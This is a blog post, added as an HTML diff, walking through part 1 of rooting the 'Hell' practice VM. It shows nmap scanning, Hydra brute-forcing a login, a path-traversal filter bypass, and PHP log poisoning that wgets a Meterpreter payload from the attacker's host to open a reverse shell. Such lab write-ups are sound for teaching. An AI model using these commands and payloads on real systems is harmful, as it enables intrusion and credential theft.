@@ -1,0 +1,333 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Hell Walkthrough - Part 1 - FourFourFourFour</title>
+  <meta name="author" content="recrudesce">
+
+  
+  <meta name="description" content="Tweet Hell Walkthrough - Part 1 Jul 17th, 2014 8:37 pm vm's Part 1 | Part 2 | Part 3 | Part 4 | Part 5 So, Peleus released a vulnerable VM on &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://recrudesce.github.io/blog/2014/07/17/hell-walkthrough-part-1/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="FourFourFourFour" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body >
+  <header role="banner" id="sidebar">
+    <!-- Logo -->
+<aside id="logo" class="clearfix">
+  <div class="clearfix">
+    <a href="/">FourFourFourFour</a>
+  </div>
+</aside>
+
+<ul id="menu">
+
+  <li class="title">
+    <h1 id="title"><a href="/">FourFourFourFour</a></h1>
+  </li>
+
+
+  <li class="subtitle">
+    <h2 id="subtitle">A Feeble Attempt At A Blog.</h2>
+  </li>
+
+  <li class="link">
+    <a href="/about/">about</a>
+  </li>
+
+  <li class="link">
+    <a href="http://twitter.com/recrudesce/">twitter</a>
+  </li>
+
+
+  <li class="link rss">
+    <a href="/atom.xml">rss feed</a>
+  </li>
+</ul>
+
+
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:recrudesce.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+
+
+<!-- Octopress Love -->
+<aside id="octopress_linkback">
+  <a href="http://octopress.org/">
+    <span class="unicode_square">
+      <span class="unicode_circle">
+        &nbsp;
+      </span>
+    </span>
+    <span class="octopress">Powered by Octopress</span>
+  </a>
+</aside>
+
+  </header>
+  <section id="main">
+    <article class="post">
+  <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://recrudesce.github.io/blog/2014/07/17/hell-walkthrough-part-1/" data-via="recrudesce" data-counturl="http://recrudesce.github.io/blog/2014/07/17/hell-walkthrough-part-1/" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+  
+  <header>
+    
+      <h2 class="entry-title">Hell Walkthrough - Part 1</h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-07-17T20:37:23+01:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>8:37 pm</span></time>
+		
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/vms/'>vm&#8217;s</a>
+  
+</span>
+
+
+        
+      </p>
+    
+  </header>
+
+
+<p>Part 1 | <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/">Part 2</a> | <a href="http://fourfourfourfour.co/2014/07/19/hell-walkthrough-part-3/">Part 3</a> | <a href="http://fourfourfourfour.co/2014/07/20/hell-walkthrough-part-4/">Part 4</a> | <a href="http://fourfourfourfour.co/2014/07/21/hell-walkthrough-part-5/">Part 5</a></p>
+
+<p>So, <a href="http://netsec.ws">Peleus</a> released a vulnerable VM on <a href="http://www.vulnhub.com">VulnHub</a>, also known as a &ldquo;boot2root&rdquo;, called Hell.</p>
+
+<p>A lot of the techniques in this VM are known to me apart from the very last step. I will go through my thought process for each step and how I managed to go from enumeration to a root shell.  This is going to be a multipart walkthrough, therefore keep checking back for updates.</p>
+
+<blockquote>[@0x42424242](https://twitter.com/0x42424242) Finally rooted your fucking VM :P
+> 
+> &#8211; Russ Watts (@recrudesce) [July 16, 2014](https://twitter.com/recrudesce/statuses/489505727887978496)</blockquote>
+
+
+
+
+<!-- more -->
+
+
+<hr />
+
+<h2>Scoping the Joint</h2>
+
+<p>NMAP - the start of any fulfilling enumeration stage.  I ran a simple NMAP scan against the VM, which returned the following results</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# nmap -sS -T4 &ndash;script banner 192.168.0.103</p>
+
+<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-07-17 19:39 BST
+Nmap scan report for 192.168.0.103
+Host is up (0.00012s latency).
+Not shown: 996 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+|<em>banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
+80/tcp  open  http
+111/tcp open  rpcbind
+666/tcp open  doom
+|</em>banner: Welcome to the Admin Panel
+MAC Address: 08:00:27:FF:3F:A0 (Cadmus Computer Systems)</p>
+
+<p>Nmap done: 1 IP address (1 host up) scanned in 5.20 seconds
+[/plain]</p>
+
+<p>OK, so we have SSH, HTTP and apparently Doom (<a href="http://www.kongregate.com/games/mike_id/doom-1">yay Doom !</a>) servers running. Based on previous experience, port 666 is more likely to be a service that is hidden behind a well known port. I wont go into the details of port 666 nor the service behind it, but lets say it&rsquo;s a distraction and a diversionary tactic - don&rsquo;t go there unless you want to waste time.  Unless you want to waste time, in which case fire up Netcat and go for your life !</p>
+
+<p>Visting the web server in a browser presents a pretty boring page that welcomes us to the server and shows a cartoon.</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_001.png" alt="" /></a></p>
+
+<p>This doesn&rsquo;t give us much to go on, therefore let&rsquo;s try out some simple things any pentester should try - let&rsquo;s see if a robots.txt file exists.  Well what do you know&hellip;</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_002.png" alt="" /></a></p>
+
+<p>The /personal/ folder shows a creepy shrine site (this is incidentally the closest I&rsquo;ve ever been to the face of a cow)</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_003.png" alt="" /></a></p>
+
+<p>Yeah, creepy&hellip; The /super_secret_login_path_muhahaha/ folder presents a login page</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_004.png" alt="" /></a></p>
+
+<hr />
+
+<h2>Getting In</h2>
+
+<p>It is assumed the username is either <strong>admin</strong> or <strong>jack</strong>, and the password relates to g0tmi1k in some way because this Jack guy is quite smitten. I could run Rockyou against the login page, but let&rsquo;s think simpler and first make a word list from the shrine site and mutate it a little with John The Ripper using a modified ruleset as per <a href="http://netsec.ws/?p=457">netsec.ws</a></p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# cewl <a href="http://192.168.0.103/personal/">http://192.168.0.103/personal/</a> -d 1 -m 6 -w password_list.txt -v
+CeWL 5.0 Robin Wood (<a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#114;&#x6f;&#x62;&#105;&#x6e;&#64;&#100;&#105;&#103;&#105;&#x6e;&#x69;&#110;&#106;&#97;&#x2e;&#111;&#114;&#x67;">&#114;&#111;&#98;&#x69;&#110;&#64;&#x64;&#x69;&#103;&#x69;&#x6e;&#x69;&#110;&#106;&#97;&#46;&#x6f;&#x72;&#103;</a>) (www.digininja.org)</p>
+
+<p>Starting at <a href="http://192.168.0.103/personal/">http://192.168.0.103/personal/</a>
+Visiting: <a href="http://192.168.0.103/personal/,">http://192.168.0.103/personal/,</a> got response code 200
+Attribute text found:</p>
+
+<p>Words found</p>
+
+<p>root@pwk:~# john &ndash;wordlist=password_list.txt &ndash;rules &ndash;stdout > password_list-mutated.txt
+words: 4251  time: 0:00:00:00 DONE (Thu Jul 17 20:08:13 2014)  w/s: 47233  current: forever99[/plain]</p>
+
+<p>Now we have a password list, we can use hydra to brute force the login.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# hydra 192.168.0.103 http-form-post &ldquo;/super_secret_login_path_muhahaha/login.php:username=^USER^&amp;password=^PASS^:Login Failed&rdquo; -l jack -P password_list-mutated.txt -t 20 -w 1 -o hydra-http-post-attack.txt
+Hydra v7.6 &copy;2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only</p>
+
+<p>[WARNING] the waittime you set is low, this can result in errornous results
+Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2014-07-17 20:10:12
+[DATA] 20 tasks, 1 server, 4251 login tries (l:1/p:4251), ~212 tries per task
+[DATA] attacking service http-post-form on port 80
+[80][www-form] host: 192.168.0.103   login: jack   password: g0tmi1k69
+1 of 1 target successfully completed, 1 valid password found
+Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2014-07-17 20:10:22[/plain]</p>
+
+<p>Success, username <strong>jack</strong>, password <strong>g0tmi1k69</strong> (yes, more creepiness, this Jack guy needs locking up). Using these credentials presents us with a management style interface</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_005.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_005.png" alt="" /></a></p>
+
+<p>I won&rsquo;t explain each section, but the two sections we are going to use are Notes and Personal.
+Notes allows us to write arbitrary text to a note.txt file stored in &ldquo;temporary storage&rdquo;, which is assumed to be /tmp as this is usually what people define as temporary storage.</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_009.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_009.png" alt="hell_009" /></a></p>
+
+<p>Personal presents another login page, which sets a cookie which has an attribute that increases with each failed login.</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_006.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_006.png" alt="" /></a></p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_007.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_007.png" alt="" /></a></p>
+
+<p>When you hit 3 failed logins, the page reverts to the main panel, and adds an error message to the top.</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_015.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_015.png" alt="hell_015" /></a></p>
+
+<p>On further investigation, the <strong>intruder</strong> attribute of the cookie is set which defines the file that is included at the top of the panel. I wonder if there&rsquo;s a local file inclusion vulnerability there.  I went about editing the cookie to try and include other files on the filesystem.  After a few minutes of frustration, I worked out that the code was filtering any instance of ../ in the include path - however, being the sneaky person I am, I discovered this can be bypassed by using &hellip;.// or &hellip;/./ instead.  Here&rsquo;s /etc/passwd included by setting the <strong>intruder</strong> cookie attribute to &hellip;.//&hellip;.//&hellip;.//&hellip;.//etc/passwd</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_008.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_008.png" alt="hell_008" /></a></p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_010.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_010.png" alt="" /></a></p>
+
+<p>It looks like the page parses any code (HTML etc) in the included file, therefore we can poison the note.txt file with PHP via the Notes feature, and include it to execute the code.  First, a PHP based reverse staged Meterpreter is created and hosted on an HTTP server.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# msfpayload php/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=443 R > sneaky.txt[/plain]</p>
+
+<p>As we are using a staged payload, a handler is required, therefore one is set up via Metasploit</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]msf > use multi/handler
+msf exploit(handler) > set payload php/meterpreter/reverse_tcp
+payload => php/meterpreter/reverse_tcp
+msf exploit(handler) > set lport 443
+lport => 443
+msf exploit(handler) > set lhost 192.168.0.110
+lhost => 192.168.0.110
+msf exploit(handler) > run</p>
+
+<p>[<em>] Started reverse handler on 192.168.0.110:443
+[</em>] Starting the payload handler&hellip;[/plain]</p>
+
+<p>Once the failed login cookie is cleared to allow us to get to features again, the following is added to the note.txt file via the Notes feature, which will download our payload from our HTTP server to the /tmp folder on the host</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]&lt;?php echo shell_exec(&lsquo;wget <a href="http://192.168.0.110/sneaky.txt">http://192.168.0.110/sneaky.txt</a> -O /tmp/sneaky.txt 2>&amp;1&rsquo;);?>[/plain]</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png" alt="hell_011" /></a></p>
+
+<p>Three failed logins are once again performed via the Personal feature to create the cookie, which is modified to include /tmp/note.txt (which includes our download PHP command)</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_012.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_012.png" alt="hell_012" /></a></p>
+
+<p>When the main panel page is reloaded, our poisoned note.txt file is included, the PHP is parsed and our payload file is downloaded.</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_013.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_013.png" alt="hell_013" /></a></p>
+
+<p>We&rsquo;re onto something here !  The cookie is edited once again to include /tmp/sneaky.txt and the panel page reloaded to execute stage 1 of our Meterpreter payload, which makes a connection to our waiting handler.</p>
+
+<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png" alt="hell_014" /></a></p>
+
+<p>[plain gutter=&ldquo;false&rdquo;][<em>] Sending stage (40551 bytes) to 192.168.0.103
+[</em>] Meterpreter session 1 opened (192.168.0.110:443 -> 192.168.0.103:48153) at 2014-07-17 21:55:37 +0100</p>
+
+<p>meterpreter >[/plain]</p>
+
+<p>Now would be a good time for a party, but there&rsquo;s hacking to do.  Plus I have no cake or balloons.  Or friends. <em><em>whimper</em></em> &hellip; HACKING !!!</p>
+
+<p>The Metepreter session can be used to get a shell, which doesn&rsquo;t seem to be TTY, but we can fix that with a nifty command thanks to <a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmi1k</a> himself (who is presumably hiding from Jack, the creepy so-and-so). The id command shows that we are currently under the context of the www-data user.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]meterpreter > shell
+Process 10279 created.
+Channel 0 created.
+python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;
+$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ [/plain]</p>
+
+<p>BAM ! We&rsquo;ve just started the journey. Now onto <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2">Part 2</a> - which involves further enumeration, and some hopping between users. You&rsquo;re in for a long long ride.</p>
+
+
+
+</article>
+
+
+    <nav role="navigation" id="pagination">
+
+</nav>
+  </section>
+  
+
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+</body>
+</html>
